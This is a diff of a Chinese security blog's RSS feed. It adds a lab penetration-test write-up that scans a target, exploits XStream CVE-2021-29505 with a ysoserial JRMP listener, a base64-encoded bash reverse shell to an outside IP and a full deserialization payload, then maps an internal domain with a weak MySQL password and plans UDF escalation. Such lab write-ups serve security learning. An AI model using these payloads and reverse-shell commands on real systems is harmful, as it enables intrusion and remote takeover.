@@ -1,5 +1,238 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Mon, 21 Sep 2026 04:52:48 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>2022网鼎杯半决赛复盘</title><link>https://faabbi.github.io/post/2022-wang-ding-bei-ban-jue-sai-fu-pan.html</link><description>&lt;html&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Tue, 22 Sep 2026 11:17:50 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Delivery</title><link>https://faabbi.github.io/post/Delivery.html</link><description>&lt;html&gt;
+&lt;body&gt;
+&lt;!--StartFragment--&gt;&lt;!-- obsidian --&gt;&lt;p&gt;这个靶子总体来说还挺简单，主要是有hint吧&lt;/p&gt;
+&lt;h1 data-heading='外网'&gt;外网&lt;/h1&gt;
+&lt;pre&gt;&lt;code class='language-zsh'&gt;┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.98.107.183
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &amp;#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.98.107.183:22 open
+39.98.107.183:80 open
+39.98.107.183:21 open
+39.98.107.183:8080 open
+[*] alive ports len is: 4
+start vulscan
+[*] WebTitle http://39.98.107.183      code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+[+] ftp 39.98.107.183:21:anonymous
+   [-&gt;]1.txt
+   [-&gt;]pom.xml
+[*] WebTitle http://39.98.107.183:8080 code:200 len:3655   title:公司发货单
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;21匿名访问&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;pom.xml&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-xml'&gt;&amp;#x3C;?xml version='1.0' encoding='UTF-8'?&gt;
+&amp;#x3C;project xmlns='http://maven.apache.org/POM/4.0.0' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+         xsi:schemaLocation='http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd'&gt;
+    &amp;#x3C;modelVersion&gt;4.0.0&amp;#x3C;/modelVersion&gt;
+    &amp;#x3C;parent&gt;
+        &amp;#x3C;groupId&gt;org.springframework.boot&amp;#x3C;/groupId&gt;
+        &amp;#x3C;artifactId&gt;spring-boot-starter-parent&amp;#x3C;/artifactId&gt;
+        &amp;#x3C;version&gt;2.7.2&amp;#x3C;/version&gt;
+        &amp;#x3C;relativePath/&gt; &amp;#x3C;!-- lookup parent from repository --&gt;
+    &amp;#x3C;/parent&gt;
+    &amp;#x3C;groupId&gt;com.example&amp;#x3C;/groupId&gt;
+    &amp;#x3C;artifactId&gt;ezjava&amp;#x3C;/artifactId&gt;
+    &amp;#x3C;version&gt;0.0.1-SNAPSHOT&amp;#x3C;/version&gt;
+    &amp;#x3C;name&gt;ezjava&amp;#x3C;/name&gt;
+    &amp;#x3C;description&gt;ezjava&amp;#x3C;/description&gt;
+    &amp;#x3C;properties&gt;
+        &amp;#x3C;java.version&gt;1.8&amp;#x3C;/java.version&gt;
+    &amp;#x3C;/properties&gt;
+    &amp;#x3C;dependencies&gt;
+        &amp;#x3C;dependency&gt;
+            &amp;#x3C;groupId&gt;org.springframework.boot&amp;#x3C;/groupId&gt;
+            &amp;#x3C;artifactId&gt;spring-boot-starter-thymeleaf&amp;#x3C;/artifactId&gt;
+        &amp;#x3C;/dependency&gt;
+        &amp;#x3C;dependency&gt;
+            &amp;#x3C;groupId&gt;org.springframework.boot&amp;#x3C;/groupId&gt;
+            &amp;#x3C;artifactId&gt;spring-boot-starter-web&amp;#x3C;/artifactId&gt;
+        &amp;#x3C;/dependency&gt;
+
+        &amp;#x3C;dependency&gt;
+            &amp;#x3C;groupId&gt;org.springframework.boot&amp;#x3C;/groupId&gt;
+            &amp;#x3C;artifactId&gt;spring-boot-starter-test&amp;#x3C;/artifactId&gt;
+            &amp;#x3C;scope&gt;test&amp;#x3C;/scope&gt;
+        &amp;#x3C;/dependency&gt;
+
+        &amp;#x3C;dependency&gt;
+            &amp;#x3C;groupId&gt;com.thoughtworks.xstream&amp;#x3C;/groupId&gt;
+            &amp;#x3C;artifactId&gt;xstream&amp;#x3C;/artifactId&gt;
+            &amp;#x3C;version&gt;1.4.16&amp;#x3C;/version&gt;
+        &amp;#x3C;/dependency&gt;
+
+        &amp;#x3C;dependency&gt;
+            &amp;#x3C;groupId&gt;commons-collections&amp;#x3C;/groupId&gt;
+            &amp;#x3C;artifactId&gt;commons-collections&amp;#x3C;/artifactId&gt;
+            &amp;#x3C;version&gt;3.2.1&amp;#x3C;/version&gt;
+        &amp;#x3C;/dependency&gt;
+    &amp;#x3C;/dependencies&gt;
+
+    &amp;#x3C;build&gt;
+        &amp;#x3C;plugins&gt;
+            &amp;#x3C;plugin&gt;
+                &amp;#x3C;groupId&gt;org.springframework.boot&amp;#x3C;/groupId&gt;
+                &amp;#x3C;artifactId&gt;spring-boot-maven-plugin&amp;#x3C;/artifactId&gt;
+            &amp;#x3C;/plugin&gt;
+        &amp;#x3C;/plugins&gt;
+    &amp;#x3C;/build&gt;
+
+&amp;#x3C;/project&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;xstream1.4.16版本，这个版本有&lt;strong&gt;CVE-2021-29505&lt;/strong&gt;&lt;br&gt;
+&lt;a href='https://www.freebuf.com/vuls/286739.html' class='external-link' target='_blank' rel='noopener nofollow' aria-label='https://www.freebuf.com/vuls/286739.html' data-tooltip-position='top'&gt;XStream反序列化命令执行漏洞复现（CVE-2021-29505） - FreeBuf网络安全行业门户&lt;/a&gt;&lt;br&gt;
+直接按着复现就行了&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;
+root@VM-8-5-ubuntu:~# java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsColl
+ections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTEuMTU5LjE3NS4yMS8yMzMyIDA+JjE=}|{base64,-d}|{bash,-i}'
+* Opening JRMP listener on 1099
+  
+root@VM-8-5-ubuntu:~# nc -lvnp 2332
+Listening on 0.0.0.0 2332
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;POST /just_sumbit_it HTTP/1.1
+Host: 39.98.107.183:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/xml;charset=utf-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 3119
+Origin: http://39.98.107.183:8080
+Connection: keep-alive
+Referer: http://39.98.107.183:8080/
+Priority: u=0
+
+
+&amp;#x3C;java.util.PriorityQueue serialization='custom'&gt;
+    &amp;#x3C;unserializable-parents/&gt;
+    &amp;#x3C;java.util.PriorityQueue&gt;
+        &amp;#x3C;default&gt;
+            &amp;#x3C;size&gt;2&amp;#x3C;/size&gt;
+        &amp;#x3C;/default&gt;
+        &amp;#x3C;int&gt;3&amp;#x3C;/int&gt;
+        &amp;#x3C;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &amp;#x3C;type&gt;12345&amp;#x3C;/type&gt;
+            &amp;#x3C;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
+                &amp;#x3C;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&amp;#x3C;/m__obj&gt;
+            &amp;#x3C;/value&gt;
+        &amp;#x3C;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+        &amp;#x3C;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &amp;#x3C;type&gt;12345&amp;#x3C;/type&gt;
+            &amp;#x3C;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;
+                &amp;#x3C;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;
+                    &amp;#x3C;parsedMessage&gt;true&amp;#x3C;/parsedMessage&gt;
+                    &amp;#x3C;soapVersion&gt;SOAP_11&amp;#x3C;/soapVersion&gt;
+                    &amp;#x3C;bodyParts/&gt;
+                    &amp;#x3C;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
+                        &amp;#x3C;attachmentsInitialized&gt;false&amp;#x3C;/attachmentsInitialized&gt;
+                        &amp;#x3C;nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;
+                            &amp;#x3C;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;
+                                &amp;#x3C;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;
+                                    &amp;#x3C;names&gt;
+                                        &amp;#x3C;string&gt;aa&amp;#x3C;/string&gt;
+                                        &amp;#x3C;string&gt;aa&amp;#x3C;/string&gt;
+                                    &amp;#x3C;/names&gt;
+                                    &amp;#x3C;ctx&gt;
+                                        &amp;#x3C;environment/&gt;
+                                        &amp;#x3C;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;
+                                            &amp;#x3C;java.rmi.server.RemoteObject&gt;
+                                                &amp;#x3C;string&gt;UnicastRef&amp;#x3C;/string&gt;
+                                                &amp;#x3C;string&gt;211.159.175.21&amp;#x3C;/string&gt;
+                                                &amp;#x3C;int&gt;1099&amp;#x3C;/int&gt;
+                                                &amp;#x3C;long&gt;0&amp;#x3C;/long&gt;
+                                                &amp;#x3C;int&gt;0&amp;#x3C;/int&gt;
+                                                &amp;#x3C;long&gt;0&amp;#x3C;/long&gt;
+                                                &amp;#x3C;short&gt;0&amp;#x3C;/short&gt;
+                                                &amp;#x3C;boolean&gt;false&amp;#x3C;/boolean&gt;
+                                            &amp;#x3C;/java.rmi.server.RemoteObject&gt;
+                                        &amp;#x3C;/registry&gt;
+                                        &amp;#x3C;host&gt;211.159.175.21&amp;#x3C;/host&gt;
+                                        &amp;#x3C;port&gt;1099&amp;#x3C;/port&gt;
+                                    &amp;#x3C;/ctx&gt;
+                                &amp;#x3C;/candidates&gt;
+                            &amp;#x3C;/aliases&gt;
+                        &amp;#x3C;/nullIter&gt;
+                    &amp;#x3C;/sm&gt;
+                &amp;#x3C;/message&gt;
+            &amp;#x3C;/value&gt;
+        &amp;#x3C;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &amp;#x3C;/java.util.PriorityQueue&gt;
+&amp;#x3C;/java.util.PriorityQueue&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发包即可&lt;/p&gt;
+&lt;h1 data-heading='内网'&gt;内网&lt;/h1&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;root@ubuntu:~# fscan -h 172.22.13.14/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &amp;#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.13.14    is alive
+(icmp) Target 172.22.13.6     is alive
+(icmp) Target 172.22.13.28    is alive
+(icmp) Target 172.22.13.57    is alive
+[*] Icmp alive hosts len is: 4
+172.22.13.14:21 open
+172.22.13.14:8080 open
+172.22.13.28:8000 open
+172.22.13.28:3306 open
+172.22.13.28:445 open
+172.22.13.6:445 open
+172.22.13.6:139 open
+172.22.13.28:139 open
+172.22.13.28:135 open
+172.22.13.57:80 open
+172.22.13.28:80 open
+172.22.13.57:22 open
+172.22.13.14:80 open
+172.22.13.14:22 open
+172.22.13.6:135 open
+172.22.13.6:88 open
+[*] alive ports len is: 16
+start vulscan
+[*] WebTitle http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS
+[*] WebTitle http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台
+[*] NetInfo
+[*]172.22.13.6
+   [-&gt;]WIN-DC
+   [-&gt;]172.22.13.6
+[*] NetInfo
+[*]172.22.13.28
+   [-&gt;]WIN-HAUWOLAO
+   [-&gt;]172.22.13.28
+[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393
+[*] WebTitle http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+[*] WebTitle http://172.22.13.14:8080  code:200 len:3655   title:公司发货单
+[*] NetBios 172.22.13.6     [+] DC:XIAORANG\WIN-DC
+[*] WebTitle http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.
+[+] ftp 172.22.13.14:21:anonymous
+   [-&gt;]1.txt
+   [-&gt;]pom.xml
+[+] mysql 172.22.13.28:3306:root 123456
+&lt;/code&gt;&lt;/pre&gt;
+
+IP | 主机名 | 域信息 | 系统版本 | 角色判断/备注 | 开放端口 | Web / 服务信息
+-- | -- | -- | -- | -- | -- | --
+172.22.13.6 | WIN-DC | DC:XIAORANG\WIN-DC | - | 域控制器（DC） | 88, 135, 139, 445 | -
+172.22.13.28 | WIN-HAUWOLAO | WIN-HAUWOLAO.xiaorang.lab | Windows Server 2016 Datacenter 14393 | Windows Server / OA / MySQL | 80, 135, 139, 445, 3306, 8000 | http://172.22.13.28 → 欢迎登录OA办公平台  http://172.22.13.28:8000 → Nothing Here.  MySQL 弱口令：172.22.13.28:3306 root / 123456
+172.22.13.57 | - | - | - | CentOS Web 服务器 | 22, 80 | http://172.22.13.57 → Welcome to CentOS
+
+
+&lt;h2 data-heading='分析'&gt;分析&lt;/h2&gt;
+&lt;h3 data-heading='172.22.13.28'&gt;172.22.13.28&lt;/h3&gt;
+&lt;p&gt;mysql有弱密码，可以试着打udf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。</description><guid isPermaLink="true">https://faabbi.github.io/post/Delivery.html</guid><pubDate>Tue, 22 Sep 2026 11:17:15 +0000</pubDate></item><item><title>2022网鼎杯半决赛复盘</title><link>https://faabbi.github.io/post/2022-wang-ding-bei-ban-jue-sai-fu-pan.html</link><description>&lt;html&gt;
 &lt;body&gt;
 &lt;!--StartFragment--&gt;&lt;!-- obsidian --&gt;&lt;h1 data-heading='外网'&gt;外网&lt;/h1&gt;
 &lt;p&gt;很经典的wordpress后台getshell，插件直接写马就行，写的时候不要启用&lt;/p&gt;
